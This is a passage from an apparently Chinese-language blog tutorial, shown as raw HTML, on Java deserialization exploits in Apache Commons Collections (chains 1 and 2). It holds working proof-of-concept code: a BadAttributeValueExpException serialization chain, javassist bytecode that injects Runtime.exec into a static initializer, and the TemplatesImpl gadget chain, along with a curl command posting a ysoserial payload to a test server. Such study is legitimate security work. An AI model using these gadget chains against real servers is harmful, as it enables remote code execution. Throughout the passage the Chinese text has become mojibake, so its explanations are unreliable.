        <span class="token class-name">Field</span> val <span class="token operator">=</span> badAttributeValueExpException<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"val"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//å¾—åˆ°valè¿™ä¸ªvariable</span>
        val<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//å› ä¸ºæ˜¯privateï¼Œæ‰€ä»¥éœ€è¦è®¾ç½®accessibleä¸ºtrue</span>
        val<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>badAttributeValueExpException<span class="token punctuation">,</span>tiedMapEntry<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//ä¿®æ”¹valçš„å€¼ä¸ºtiedMapEntry</span>
        <span class="token comment">//åºåˆ—åŒ–</span>
        <span class="token class-name">FileOutputStream</span> fileOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"lz.cer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ObjectOutputStream</span> objectOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>fileOutputStream<span class="token punctuation">)</span><span class="token punctuation">;</span>
        objectOutputStream<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>badAttributeValueExpException<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//åºåˆ—åŒ–badAttributeValueExpException</span>
        objectOutputStream<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        objectOutputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        fileOutputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">/*
         * æœåŠ¡ç«¯ååºåˆ—åŒ–è¯»å–ï¼Œå¹¶è§¦å‘æ¼æ´
         * */</span>
        <span class="token comment">//ååºåˆ—åŒ–</span>
        <span class="token class-name">FileInputStream</span> fileInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"lz.cer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ObjectInputStream</span> objectInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span>fileInputStream<span class="token punctuation">)</span><span class="token punctuation">;</span>
        objectInputStream<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//åªéœ€è¦readObject()å°±ä¼šè§¦å‘æ¼æ´</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><p><a target="_blank" rel="noopener" href="http://wjlshare.com/archives/1498#Transformer">Javaååºåˆ—åŒ–-CommonCollections</a></p>
<p><a target="_blank" rel="noopener" href="https://www.guildhab.top/2020/06/java-rmi-%E5%88%A9%E7%94%A84-%E6%9C%80%E5%9F%BA%E6%9C%AC%E7%9A%84%E4%B8%A4%E6%9D%A1-apache-commons-collections-pop-gadget-chains/">Java ååºåˆ—åŒ–æ¼æ´(4) â€“ Apache Commons Collections POP Gadget Chains å‰–æ</a></p>
<p><a target="_blank" rel="noopener" href="https://0range228.github.io/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91commons-collections-1%20%E7%BB%84%E4%BB%B6/">ã€ååºåˆ—åŒ–æ¼æ´ã€‘commons-collections-1 ç»„ä»¶</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/yyhuni/p/14777166.html">Javaååºåˆ—åŒ–æ¼æ´Apache CommonsCollectionsåˆ†æ</a></p>
<h2 id="Commons-Collections-2"><a href="#Commons-Collections-2" class="headerlink" title="Commons Collections 2"></a>Commons Collections 2</h2><h3 id="ç¯å¢ƒæ­å»º-1"><a href="#ç¯å¢ƒæ­å»º-1" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h3><p><a target="_blank" rel="noopener" href="https://mvnrepository.com/artifact/org.apache.commons/commons-collections4/4.0">CommonsCollections4-4.0</a></p>
<p>jdk1.7 1.8ä½ç‰ˆæœ¬</p>
<p><a target="_blank" rel="noopener" href="https://leihehehe.github.io/2021/09/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BYsoserial%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE-6/">Javaååºåˆ—åŒ–æ¼æ´ä¹‹Ysoserialå®‰è£…é…ç½®</a>ä¸­çš„<strong>WebServerç¯å¢ƒæ­å»º</strong>ç« èŠ‚</p>
<h3 id="å¤ç°æ¼”ç¤º"><a href="#å¤ç°æ¼”ç¤º" class="headerlink" title="å¤ç°æ¼”ç¤º"></a>å¤ç°æ¼”ç¤º</h3><p>é¦–å…ˆåœ¨Ysoserialä¸­é…ç½®ï¼š</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211126190531654.png" alt="image-20211126190531654" loading="lazy"></p>
<p>è¿è¡Œç”Ÿæˆï¼š</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211126190648753.png" alt="image-20211126190648753" loading="lazy"></p>
<p>è¿è¡Œæˆ‘ä»¬çš„webserverï¼š</p>
<p><code>curl &quot;http://localhost:9090/webTest1_Web_exploded/test&quot; --data-binary @payload.ser</code></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211126191106461.png" alt="image-20211126191106461" loading="lazy"></p>
<p>å³å¯å¼¹å‡ºè®¡ç®—å™¨ã€‚</p>
<h3 id="å‰ç½®çŸ¥è¯†"><a href="#å‰ç½®çŸ¥è¯†" class="headerlink" title="å‰ç½®çŸ¥è¯†"></a>å‰ç½®çŸ¥è¯†</h3><h4 id="CommonsCollections-2-åˆ©ç”¨é“¾åŸç†"><a href="#CommonsCollections-2-åˆ©ç”¨é“¾åŸç†" class="headerlink" title="CommonsCollections 2 åˆ©ç”¨é“¾åŸç†"></a>CommonsCollections 2 åˆ©ç”¨é“¾åŸç†</h4><p>åœ¨<strong>CommonsCollections2</strong>ä¸­ï¼Œæˆ‘ä»¬å°†ä½¿ç”¨<a target="_blank" rel="noopener" href="https://leihehehe.github.io/2021/11/24/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BJavassist-8/">javassist</a>åœ¨javaå­—èŠ‚ç (.class)ä¸­æ’å…¥å‘½ä»¤æ‰§è¡Œä»£ç ï¼Œæ¥ç€ç”¨æŸä¸ªé‡å†™äº†<code>loadClass</code>æ–¹æ³•çš„<strong>ClassLoader</strong>æ¥åŠ è½½æˆ‘ä»¬ç”Ÿæˆå¥½çš„å­—èŠ‚ç (.classæ–‡ä»¶)ï¼Œå®ç°æ‰§è¡Œæ¶æ„ä»£ç çš„æ•ˆæœã€‚ClassLoaderç”¨åŒäº²å§”æ´¾æœºåˆ¶æ¥åŠ è½½Classã€‚</p>
<h4 id="Javassistç”Ÿæˆæ‰§è¡Œå‘½ä»¤çš„Class"><a href="#Javassistç”Ÿæˆæ‰§è¡Œå‘½ä»¤çš„Class" class="headerlink" title="Javassistç”Ÿæˆæ‰§è¡Œå‘½ä»¤çš„Class"></a>Javassistç”Ÿæˆæ‰§è¡Œå‘½ä»¤çš„Class</h4><p>é¦–å…ˆæˆ‘ä»¬å…ˆæ¨¡æ‹Ÿä»¥ä¸‹<strong>javassist</strong>æ€ä¹ˆç”Ÿæˆæ‰§è¡Œå‘½ä»¤çš„å­—èŠ‚ç </p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javassist<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> javassistTest <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">NotFoundException</span><span class="token punctuation">,</span> <span class="token class-name">CannotCompileException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span><span class="token punctuation">,</span> <span class="token class-name">InstantiationException</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">//éœ€è¦åˆ›å»ºçš„classå¯¹åº”ä¸€ä¸ªCtClass, ClassPoolæ˜¯ä¸€ä¸ªå®¹å™¨ï¼ŒåŒ…å«äº†å„ç§CtClass</span>
        <span class="token class-name">ClassPool</span> cp <span class="token operator">=</span> <span class="token class-name">ClassPool</span><span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//è·å–ä¸€ä¸ªé»˜è®¤çš„ClassPool</span>
        <span class="token class-name">CtClass</span> cc <span class="token operator">=</span> cp<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>javassistTest<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//æ ¹æ®åå°„çŸ¥è¯†ï¼ŒjavassistTest.classæ˜¯javassistTest instance(object),å°†javassistTest objectçš„åå­—æ”¾å…¥ClassPoolçš„hashmapä¸­ï¼Œå¹¶è¿”å›ä¸€ä¸ªctClass</span>
        <span class="token class-name">String</span> cmd <span class="token operator">=</span> <span class="token string">"java.lang.Runtime.getRuntime().exec(\"calc\");"</span><span class="token punctuation">;</span>
        cc<span class="token punctuation">.</span><span class="token function">makeClassInitializer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">insertBefore</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//é€šè¿‡CtClass.makeClassInitializeræ–¹æ³•åœ¨å½“å‰ç±»åˆ›å»ºäº†ä¸€ä¸ªé™æ€ä»£ç å—</span>
        cc<span class="token punctuation">.</span><span class="token function">setName</span><span class="token punctuation">(</span><span class="token string">"Leihehe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        cc<span class="token punctuation">.</span><span class="token function">writeFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><code>CtClass cc = cp.get(javassistTest.class.getName());</code></p>
<p>æˆ‘ä»¬çŸ¥é“æ¯ä¸ªéœ€è¦ä¿®æ”¹ç¼–è¾‘çš„Classéƒ½éœ€è¦æœ‰ä¸€ä¸ª<strong>CtClass</strong>ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ä¸ºæˆ‘ä»¬éœ€è¦ä¿®æ”¹çš„classåˆ›å»ºä¸€ä¸ªCtClassã€‚æ­¤å¤„ï¼Œæˆ‘ä»¬æŠŠjavassistTest objectæ”¾å…¥äº†ClassPoolçš„hashmapä¸­ï¼ˆè¡¨æ˜æˆ‘ä»¬éœ€è¦ä¿®æ”¹æ­¤ç±»ï¼‰ï¼Œå®ƒä¼šç»™æˆ‘ä»¬è¿”å›ä¸€ä¸ªæ–°çš„CtClassã€‚</p>
<blockquote>
<p>The <strong>java.lang.Class.getName()</strong> returns the name of the entity (class, interface, array class, primitive type, or void) represented by this Class object, as a String.</p>
</blockquote>
<p>æ‰€ä»¥æˆ‘ä»¬æ˜¯åœ¨hashmapä¸­æ”¾å…¥javassistTest objectçš„åå­—ï¼Œç„¶åè¿”å›äº†ä¸€ä¸ªæ–°çš„CtClassã€‚</p>
<p>å½“æˆ‘ä»¬å¾—åˆ°äº†è¿™ä¸ªæ–°çš„CtClassï¼Œæˆ‘ä»¬å°±å¯ä»¥å¯¹å­—èŠ‚ç è¿›è¡Œæ“ä½œäº†ã€‚</p>
<blockquote>
<p>CtConstructor, <em>makeClassInitializer</em>(). Makes an empty class initializer (static constructor).</p>
</blockquote>
<p><code> cc.makeClassInitializer().insertBefore(cmd)</code>åˆ›å»ºäº†ä¸€ä¸ªstaticä»£ç å—ï¼Œå¹¶æŠŠcmdæ’å…¥åˆ°äº†staticä»£ç å—å‰é¢ï¼Œå¦‚ä¸‹ï¼š</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">static</span> <span class="token punctuation">&#123;</span>
    <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><code>cc.setName(&quot;Leihehe&quot;);</code>è®¾ç½®äº†å­—èŠ‚ç ä¸­çš„ç±»å</p>
<p><code>cc.writeFile();</code>æ˜¯å°†å­—èŠ‚ç ä¿å­˜åˆ°æ–‡ä»¶ä¸­ã€‚<strong>è¿™æ—¶å€™ï¼Œæˆ‘ä»¬çš„å­—èŠ‚ç ç¼–å†™å·¥ä½œå°±å®Œæˆäº†ï¼</strong></p>
<h4 id="ClassLoaderåŠ è½½å­—èŠ‚ç "><a href="#ClassLoaderåŠ è½½å­—èŠ‚ç " class="headerlink" title="ClassLoaderåŠ è½½å­—èŠ‚ç "></a>ClassLoaderåŠ è½½å­—èŠ‚ç </h4><p>æˆ‘ä»¬å¹³æ—¶å†™ä»£ç çš„æ–‡ä»¶éƒ½æ˜¯.javaæ ¼å¼ï¼Œç»è¿‡ç¼–è¯‘åï¼Œä¼šç”Ÿæˆ.classæ–‡ä»¶ï¼Œä¹Ÿå°±æ˜¯å­—èŠ‚ç ã€‚ JVMè™šæ‹Ÿæœºæƒ³è¦æ‰§è¡Œå­—èŠ‚ç çš„è¯ï¼Œéœ€è¦ä½¿ç”¨<strong>ClassLoader Class</strong>æ¥å°†è¿™äº›æ–‡ä»¶loadè¿›JVMï¼Œå…¶ä¸­çš„<code>defineClass()</code>æ–¹æ³•å°±æ˜¯æ¥åšè¿™ä»¶äº‹çš„ã€‚</p>
<p>ä¸‹é¢æˆ‘ä»¬æ‰‹å†™ä¸€ä¸ªClassLoaderæ¥åŠ è½½å­—èŠ‚ç </p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TestClassLoader</span> <span class="token keyword">extends</span> <span class="token class-name">ClassLoader</span> <span class="token punctuation">&#123;</span><span class="token comment">//ç»§æ‰¿ClassLoader</span>
    <span class="token keyword">public</span> <span class="token class-name">TestClassLoader</span><span class="token punctuation">(</span><span class="token class-name">ClassLoader</span> parent<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">super</span><span class="token punctuation">(</span>parent<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token class-name">Class</span> <span class="token function">g</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">,</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> b<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">defineClass</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span>b<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>b<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>æ¥ç€ï¼Œ æˆ‘ä»¬åœ¨ä¹‹å‰çš„<code>javassistTest </code> Classé‡Œæ·»åŠ ä»¥ä¸‹ä»£ç ï¼š</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">final</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> classBytes <span class="token operator">=</span> cc<span class="token punctuation">.</span><span class="token function">toBytecode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//è·å–å­—èŠ‚ç </span>
<span class="token keyword">new</span> <span class="token class-name">TestClassLoader</span><span class="token punctuation">(</span>javassistTest<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">g</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span>classBytes<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><code>TestClassLoader(javassistTest.class.getClassLoader())</code>åŠ è½½äº†å­—èŠ‚ç ï¼Œ<code>g()</code>å°†bytes[]ç±»å‹çš„å­—èŠ‚ç è½¬æ¢æˆäº†ä¸€ä¸ªClass instanceï¼Œä½†Class instanceä¸­çš„å†…å®¹å¹¶ä¸ä¼šä¸»åŠ¨æ‰§è¡Œ(staticä»£ç åŒº)å’Œåˆå§‹åŒ–ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ä½¿ç”¨newInstance()æ‰‹åŠ¨è§¦å‘ã€‚</p>
<p><strong>æ•ˆæœï¼š</strong></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211126223902264.png" alt="image-20211126223902264" loading="lazy"></p>
<h4 id="TemplateImplç±»åŠå…¶åˆ©ç”¨é“¾"><a href="#TemplateImplç±»åŠå…¶åˆ©ç”¨é“¾" class="headerlink" title="TemplateImplç±»åŠå…¶åˆ©ç”¨é“¾"></a>TemplateImplç±»åŠå…¶åˆ©ç”¨é“¾</h4><h5 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h5><p>Javassistå°†ClassåŠ è½½æˆå­—èŠ‚ç ï¼Œå¹¶å¯¹å…¶æ‰§è¡Œæ–¹æ³•è¿›è¡Œä¿®æ”¹ï¼ˆä¾‹å¦‚ï¼šæ’å…¥æ¶æ„ä»£ç ï¼‰ï¼Œæ¥ç€æˆ‘ä»¬å°†å­—èŠ‚ç ä¼ å…¥Aç±»çš„å˜é‡ä¸­ã€‚æ­¤å¤„çš„Aç±»èƒ½å°†è¯¥å˜é‡ä¸­çš„å­—èŠ‚ç å®ä¾‹åŒ–ä¸ºå¯¹è±¡ï¼Œä»è€Œè§¦å‘å…¶ä¸­çš„staticæ–¹æ³•ã€‚</p>
<p>åœ¨CommonsCollections 2åˆ©ç”¨é“¾ä¸­ï¼Œ<strong>TemplateImpl Class</strong>å°±æ˜¯æˆ‘ä»¬payloadæ„é€ çš„èµ·ç‚¹ã€‚<strong>TemplateImpl Class</strong>ä¸­èƒ½å°†bytecodeså˜é‡ç”¨<strong>Classloader</strong> loadå¹¶æ‰§è¡Œï¼š</p>
<p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å…ˆæ¥å€’ç€åˆ†æä¸€ä¸‹ï¼šæˆ‘ä»¬é¦–å…ˆéœ€è¦æ‰¾åˆ°å¯ä»¥æ‰§è¡Œæ¼æ´çš„åœ°æ–¹ã€‚</p>
<h5 id="defineTransletClasses"><a href="#defineTransletClasses" class="headerlink" title="defineTransletClasses"></a>defineTransletClasses</h5><p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211127154940678.png" alt="image-20211127154940678" loading="lazy"></p>
<p>é€šè¿‡è§‚å¯Ÿä¸Šå›¾<code>defineTransletClasses()</code>ä¸­çš„å†…å®¹ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°æ­¤å¤„åˆ›å»ºäº†ä¸€ä¸ªæ–°çš„<strong>TransletClassLoader instance</strong>ï¼Œå¹¶è¿”å›åˆ°å˜é‡<strong>loader</strong>ã€‚å› ä¸ºæœ€åä¸€è¡Œè¦è®¿é—®<code>_tfactory.getEcternalEctensionMap()</code>ï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬éœ€è¦callè¿™ä¸ªæ–¹æ³•çš„è¯ï¼Œéœ€è¦è®¾ç½®<code>_tfactory</code>çš„å€¼ï¼Œå› å…¶ä¸º<strong>TransformerFactoryImpl</strong>ç±»å‹ï¼Œæ‰€ä»¥æˆ‘ä»¬newä¸€ä¸ªå°±å¯ä»¥äº†ï¼Œ</p>
<h5 id="defineClass"><a href="#defineClass" class="headerlink" title="defineClass"></a>defineClass</h5><p>æ¥ç€è¿™ä¸‹é¢åˆæœ‰ä¸€æ®µä»£ç </p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211127214801875.png" alt="image-20211127214801875" loading="lazy"></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Class</span> <span class="token function">defineClass</span><span class="token punctuation">(</span><span class="token keyword">final</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> b<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token function">defineClass</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> b<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> b<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>åœ¨ä¸Šå›¾ä¸­ï¼Œ<code>loader.defineClass(_bytecodes[i]);</code>å°†å­—èŠ‚ç **_bytecodes<strong>ä¼ å…¥</strong>loader** - åŠ è½½å­—ç¬¦ç ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæˆ‘ä»¬çš„å­—èŠ‚ç çš„super classå¿…é¡»æ˜¯AbstractTransletç±»ã€‚</p>
<p>é‚£ä¹ˆæˆ‘ä»¬è¦å¦‚ä½•æ‰èƒ½<strong>è§¦å‘defineTransletClasses -&gt; loader.defineClasså‘¢ï¼Ÿ</strong></p>
<h5 id="getTransletInstance"><a href="#getTransletInstance" class="headerlink" title="getTransletInstance()"></a>getTransletInstance()</h5><p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211127161222841.png" alt="image-20211127161222841" loading="lazy">æ¥ç€æˆ‘ä»¬å¯ä»¥é€šè¿‡<code>getTranslateInstance()</code>æ¥callåˆ°<code>defineTransletClasses()</code> - å½“<code>_class</code>ä¸ºç©ºæ—¶ï¼Œ<code>defineTransletClasses()</code>ä¼šè¢«æ‰§è¡Œã€‚è€Œä¹‹å <code>.newInstance()</code>åˆ›å»ºäº†instanceï¼Œæ‰§è¡Œå‘½ä»¤ã€‚ä½†è¦æƒ³è¦æ‰§è¡Œåˆ°<code>newInstance()</code>,æˆ‘ä»¬éœ€è¦æ»¡è¶³<code>_name != null</code></p>
<p>é‚£ä¹ˆå“ªé‡Œåˆå¯ä»¥callåˆ°**getTransletInstance()**å‘¢ï¼Ÿ</p>
<h5 id="newTransformer"><a href="#newTransformer" class="headerlink" title="newTransformer()"></a>newTransformer()</h5><p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211127212356132.png" alt="image-20211127212356132" loading="lazy"></p>
<h5 id="getOutputProperties"><a href="#getOutputProperties" class="headerlink" title="getOutputProperties()"></a>getOutputProperties()</h5><p>åŒæ ·åœ¨<strong>TransformerImpl</strong>ç±»çš„<code>getOutputProperties()</code>æ–¹æ³•ä¸­å‘ç°newTransformer()è¢«calläº†<img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211127212511457.png" alt="image-20211127212511457" loading="lazy"></p>
<h5 id="å®Œæ•´åˆ©ç”¨é“¾"><a href="#å®Œæ•´åˆ©ç”¨é“¾" class="headerlink" title="å®Œæ•´åˆ©ç”¨é“¾"></a>å®Œæ•´åˆ©ç”¨é“¾</h5><p>å› æ­¤æˆ‘ä»¬å¯ä»¥æ€»ç»“å‡ºï¼Œå®Œæ•´çš„åˆ©ç”¨é“¾ï¼š</p>
<blockquote>
<p>TemplatesImpl.getOutputProperties()<br>TemplatesImpl.newTransformer()<br> TemplatesImpl.getTransletInstance()<br>     TemplatesImpl.defineTransletClasses()<br>         TransletClassLoader.defineClass()</p>
</blockquote>
<p><code>newTransformer()</code>ä¹Ÿå¯ä½œä¸ºåˆ©ç”¨é“¾çš„å¼€ç«¯</p>
<p>ç»è¿‡åˆ†æï¼Œæˆ‘ä»¬åªéœ€è¦ç»™<strong>TransletImpl</strong>ç±»ç»™ä»¥ä¸‹çš„attributesèµ‹å€¼ï¼š</p>
<ul>
<li><strong>_bytecodes(æ¶æ„å­—èŠ‚ç )</strong></li>
<li><strong>_class(null)</strong></li>
<li><strong>_name(ä»»æ„éç©ºå­—ç¬¦ä¸²)</strong></li>
<li><strong>_tfactory(new TransformerFactoryImpl())</strong></li>
</ul>
<p>åŒæ—¶ï¼Œæˆ‘ä»¬çš„å­—èŠ‚ç Classéœ€è¦ç»§æ‰¿<strong>AbstractTranslet</strong>ç±»</p>
<p>æœ€åcall <code>TemplatesImpl.getOutputProperties()</code>å³å¯ã€‚</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TempTest</span> <span class="token keyword">extends</span> <span class="token class-name">AbstractTranslet</span> <span class="token keyword">implements</span> <span class="token class-name">Serializable</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">//å¿…é¡»ç»§æ‰¿AbstractTranslet</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">NotFoundException</span><span class="token punctuation">,</span> <span class="token class-name">CannotCompileException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span><span class="token punctuation">,</span> <span class="token class-name">InstantiationException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span><span class="token punctuation">,</span> <span class="token class-name">NoSuchFieldException</span><span class="token punctuation">,</span> <span class="token class-name">TransformerConfigurationException</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">/*æ„é€ æ¶æ„ä»£ç ï¼Œå¹¶ä½¿ç”¨javassistç”Ÿæˆå­—èŠ‚ç */</span>
        <span class="token class-name">ClassPool</span> classPool <span class="token operator">=</span> <span class="token class-name">ClassPool</span><span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//å¾—åˆ°é»˜è®¤classPool</span>
        <span class="token keyword">final</span> <span class="token class-name">CtClass</span> ctClass<span class="token operator">=</span> classPool<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token class-name">TempTest</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//ä»ClassPoolä¸­è·å–å±äºTempTestçš„CtClass</span>
        <span class="token class-name">String</span> cmd <span class="token operator">=</span> <span class="token string">"java.lang.Runtime.getRuntime().exec(\"calc\");"</span><span class="token punctuation">;</span>
        ctClass<span class="token punctuation">.</span><span class="token function">makeClassInitializer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">insertBefore</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">;</span>
